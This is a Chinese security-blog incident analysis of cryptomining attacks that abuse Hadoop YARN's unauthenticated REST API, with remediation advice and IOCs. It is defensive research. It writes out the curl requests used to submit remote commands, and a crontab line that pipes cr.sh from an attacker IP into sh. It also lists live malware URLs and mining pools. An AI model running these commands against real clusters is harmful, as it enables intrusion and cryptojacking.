> 原文链接: https://www.anquanke.com//post/id/147208 


# Hadoop Yarn REST API未授权漏洞利用挖矿分析


                                阅读量   
                                **98089**
                            
                        |
                        
                                                                                    



[![](https://p4.ssl.qhimg.com/t0172e1f4d53d84d1a1.jpg)](https://p4.ssl.qhimg.com/t0172e1f4d53d84d1a1.jpg)

Fooying@云鼎实验室 2018/05/30



## 一、 背景

5月5日腾讯云安全曾针对“攻击者利用Hadoop Yarn资源管理系统REST API未授权漏洞对服务器进行攻击，攻击者可以在未授权的情况下远程执行代码”的安全问题进行预警，在预警的前后我们曾多次捕获相关的攻击案例，其中就包含利用该问题进行挖矿，我们针对其中一个案例进行分析并提供响应的安全建议和解决方案。



## 二、 漏洞说明

Hadoop是一个由Apache基金会所开发的分布式系统基础架构，YARN是hadoop系统上的资源统一管理平台，其主要作用是实现集群资源的统一管理和调度，可以把MapReduce计算框架作为一个应用程序运行在YARN系统之上，通过YARN来管理资源。简单的说，用户可以向YARN提交特定应用程序进行执行，其中就允许执行相关包含系统命令。<br>
YARN提供有默认开放在8088和8090的REST API（默认前者）允许用户直接通过API进行相关的应用创建、任务提交执行等操作，如果配置不当，REST API将会开放在公网导致未授权访问的问题，那么任何黑客则就均可利用其进行远程命令执行，从而进行挖矿等行为。<br>**攻击步骤：**
<li>申请新的application<br>
直接通过curl进行POST请求<br>
curl -v -X POST ‘[http://ip:8088/ws/v1/cluster/apps/new-application](http://ip:8088/ws/v1/cluster/apps/new-application)‘<br>
返回内容类似于：<br>[![](https://p1.ssl.qhimg.com/t01ad2ca6844e3851c4.jpg)](https://p1.ssl.qhimg.com/t01ad2ca6844e3851c4.jpg)
</li>
构造并提交任务<br>
构造json文件1.json，内容如下，其中application-id对应上面得到的id，命令内容为尝试在/var/tmp目录下创建11112222_test_111122222文件，内容也为111：<br>[![](https://p0.ssl.qhimg.com/t010a45a1a91f804aed.jpg)](https://p0.ssl.qhimg.com/t010a45a1a91f804aed.jpg)<br>
然后直接<br>
curl -s -i -X POST -H ‘Accept: application/json’ -H ‘Content-Type: application/json’ [http://ip:8088/ws/v1/cluster/apps](http://ip:8088/ws/v1/cluster/apps) —data-binary [@1](https://github.com/1).json<br>
即可完成攻击，命令被执行，在相应目录下可以看到生成了对应文件<br>[![](https://p4.ssl.qhimg.com/t0188186027bfadcd1c.png)](https://p4.ssl.qhimg.com/t0188186027bfadcd1c.png)<br>
更多漏洞详情可以参考 [http://bbs.qcloud.com/thread-50090-1-1.html](http://bbs.qcloud.com/thread-50090-1-1.html)



## 三、 入侵分析

在本次分析的案例中，受害机器部署有Hadoop YARN，并且存在未授权访问的安全问题，黑客直接利用开放在8088的REST API提交执行命令，来实现在服务器内下载执行.sh脚本，从而再进一步下载启动挖矿程序达到挖矿的目的。<br>[![](https://p3.ssl.qhimg.com/t01ed2fffed22dc6e6a.png)](https://p3.ssl.qhimg.com/t01ed2fffed22dc6e6a.png)<br>
整个利用过程相对比较简单，通过捕捉Hadoop 的launch_container.sh执行脚本，我们可以看到其中一个案例中相关任务执行的命令：<br>[![](https://p5.ssl.qhimg.com/t0107bbc9ed15a005dc.jpg)](https://p5.ssl.qhimg.com/t0107bbc9ed15a005dc.jpg)<br>
可以很明显的看到第8行位置，从185.222.210.59下载并执行了一个名为x_wcr.sh的脚本。<br>
在实际过程中，我们从多个案例捕获了多个比如名为cr.sh的不同脚本，但实际的功能代码都差不多，我们对其中一个x_wcr.sh脚本进行分析，代码自上而下内容：<br>[![](https://p2.ssl.qhimg.com/t01ee6b5db5278055c6.jpg)](https://p2.ssl.qhimg.com/t01ee6b5db5278055c6.jpg)<br>
这部分代码主要针对已存在的挖矿进程、文件进行清理。<br>[![](https://p0.ssl.qhimg.com/t014e33b8281e729426.jpg)](https://p0.ssl.qhimg.com/t014e33b8281e729426.jpg)<br>
这部分的代码主要是判断如果/tmp/java是一个存在并且可写的文件，那么就判断其MD5值是否匹配，MD5不匹配则根据w.conf关键词查找并kill进程；如果非可写的文件，则重新赋值DIR变量，这个变量主要用于后面部分代码中下载挖矿等程序存放目录。<br>[![](https://p2.ssl.qhimg.com/t01627084f0ca557c77.jpg)](https://p2.ssl.qhimg.com/t01627084f0ca557c77.jpg)<br>
然后接着是一些变量的赋值，包括再次判断如果/tmp/java是一个目录，则重新赋值DIR变量；判断curl和wget命令是否存在，存在则赋值到WGET变量；f2则是赋值为某个IP，实则为是后续下载相关文件的服务器之一。<br>[![](https://p4.ssl.qhimg.com/t0181e8e0a60e12284d.jpg)](https://p4.ssl.qhimg.com/t0181e8e0a60e12284d.jpg)<br>
这部分代码是其中比较核心的代码，通过downloadIfNeed方法下载挖矿程序到$DIR目录下并重命名为java，下载w.conf配置文件，给挖矿程序增加执行权限，然后以nohup命令后台运行挖矿程序并删除配置文件；接着检查crontab中的任务，如果不存在对应的任务，就将下载执行脚本的任务” * $LDR [http://185.222.210.59/cr.sh](http://185.222.210.59/cr.sh) | sh &gt; /dev/null 2&gt;&amp;1”添加到其中,这里$LDR为wget -q -O -或者curl，任务每分钟执行一次。<br>
脚本中还包含了几个嵌套调用的download方法，入口方法是downloadIfNeed：<br>[![](https://p2.ssl.qhimg.com/t012e81ba56887fe935.jpg)](https://p2.ssl.qhimg.com/t012e81ba56887fe935.jpg)<br>[![](https://p2.ssl.qhimg.com/t01d3f345896e4bf00f.jpg)](https://p2.ssl.qhimg.com/t01d3f345896e4bf00f.jpg)<br>
这个方法的核心功能还是校验已存在的挖矿程序的MD5，如果无法验证或者文件不存在的情况，则直接调用download方法下载挖矿程序；如果文件存在但MD5匹配不正确，则调用download方法后再次验证，验证失败则尝试从另外一个下载渠道[https://transfer.sh/WoGXx/zzz](https://transfer.sh/WoGXx/zzz) 下载挖矿程序并再次验证。最后还将相关结果上报到目标服务器$f2的re.php.<br>
tmp.txt内容示例：<br>[![](https://p2.ssl.qhimg.com/t010a9960d82356fc33.png)](https://p2.ssl.qhimg.com/t010a9960d82356fc33.png)<br>[![](https://p3.ssl.qhimg.com/t015955ac16f853616b.jpg)](https://p3.ssl.qhimg.com/t015955ac16f853616b.jpg)<br>
download方法判断ppc文件的存在与否和 MD5是否匹配，如果不存在或MD5不匹配则调用download2下载，如果存在则复制重名为java。<br>[![](https://p5.ssl.qhimg.com/t0130ec498bda5663d4.jpg)](https://p5.ssl.qhimg.com/t0130ec498bda5663d4.jpg)<br>
在脚本的最后部分还有一些进程、文件、crontab清理的处理，用pkill删除满足条件的进程，删除tmp目录下pscd开头的文件，以及说删除crontab中存在某些关键词的任务。

至此，我们完成整个脚本的分析，虽然整个脚本比较冗长，而且似乎各个函数嵌套调用，涉及文件也众多，但其实整体就做了以下几件事：
1. 清理相关的进程、文件和crontab任务
1. 判断并下载挖矿程序，同时校验MD5值，除了黑客自己控制的服务器，还利用[https://transfer.sh](https://transfer.sh) 提供备用下载，多种方式保障
增加脚本下载执行任务添加到crontab里<br>
其实，我们通过查看YARN的日志文件yarn-root-nodemanager-master.hadoop.log也可能看到相应的痕迹：<br>[![](https://p1.ssl.qhimg.com/t0111c18c73c3991b16.png)](https://p1.ssl.qhimg.com/t0111c18c73c3991b16.png)<br>[![](https://p3.ssl.qhimg.com/t01ec3277aba6ded1bb.png)](https://p3.ssl.qhimg.com/t01ec3277aba6ded1bb.png)<br>
或者我们通过管理UI查看application详情：<br>[![](https://p1.ssl.qhimg.com/t010ca0d81a40898a5d.png)](https://p1.ssl.qhimg.com/t010ca0d81a40898a5d.png)<br>
而crontab的任务日志也能看到相关的执行记录：<br>[![](https://p4.ssl.qhimg.com/t01daf2b6f5889396eb.png)](https://p4.ssl.qhimg.com/t01daf2b6f5889396eb.png)<br>
最终在/var/tmp目录下也能找到相关的文件<br>[![](https://p0.ssl.qhimg.com/t0184fb0ec7fae862d9.png)](https://p0.ssl.qhimg.com/t0184fb0ec7fae862d9.png)

## 四、 安全建议

**清理病毒**
1. 使用top查看进程，kill掉异常进程
1. 检查/tmp和/var/tmp目录，删除java、ppc、w.conf等异常文件
1. 检查crontab任务列表，删除异常任务
<li>排查YARN日志，确认异常的application，删除处理<br>**安全加固**
</li>
1. 通过iptables或者安全组配置访问策略，限制对8088等端口的访问
1. 如无必要，不要将接口开放在公网，改为本地或者内网调用
1. 升级Hadoop到2.x版本以上，并启用Kerberos认证功能，禁止匿名访问
1. 云镜当前已支持该漏洞检测，同时也支持挖矿木马的发现，建议安装云镜并开通专业版，及时发现漏洞并修复或者在中马后能及时收到提醒进行止损
更多自检和修复建议可以参考 [http://bbs.qcloud.com/thread-50090-1-1.html](http://bbs.qcloud.com/thread-50090-1-1.html)<a class="reference-link" name="**%E4%BA%94%E3%80%81%20IOCs"></a>



## 五、 IOCs

钱包地址**<br>
4AB31XZu3bKeUWtwGQ43ZadTKCfCzq3wra6yNbKdsucpRfgofJP3YwqDiTutrufk8D17D7xw1zPGyMspv8Lqwwg36V5chYg<br>
MD5
1. c8c1f2da51fbd0aea60e11a81236c9dc
1. 183664ceb9c4d7179d5345249f1ee0c4
<li>b00f4bbd82d2f5ec7c8152625684f853<br>**矿池地址**
</li>
1. 158.69.133.20:3333
1. 192.99.142.249:3333
1. 202.144.193.110:3333
<li>46.30.43.159:80<br>**部分相关URL**
</li>
1. [http://185.222.210.59/x_wcr.sh](http://185.222.210.59/x_wcr.sh)
1. [http://185.222.210.59/re.php](http://185.222.210.59/re.php)
1. [http://185.222.210.59/g.php](http://185.222.210.59/g.php)
1. [http://185.222.210.59/w.conf](http://185.222.210.59/w.conf)
1. [http://185.222.210.59/cr.sh](http://185.222.210.59/cr.sh)
1. [http://192.99.142.226:8220/w.conf](http://192.99.142.226:8220/w.conf)
1. [http://192.99.142.226:8220/xm64](http://192.99.142.226:8220/xm64)
1. [http://192.99.142.226:8220/cr.sh](http://192.99.142.226:8220/cr.sh)
1. [http://95.142.40.83/xm64](http://95.142.40.83/xm64)
1. [http://95.142.40.83/xm32](http://95.142.40.83/xm32)
1. [https://transfer.sh/1o3Kj/zzz](https://transfer.sh/1o3Kj/zzz)
1. [https://transfer.sh/wbl5H/pscf](https://transfer.sh/wbl5H/pscf)
1. [https://transfer.sh/WoGXx/zzz](https://transfer.sh/WoGXx/zzz)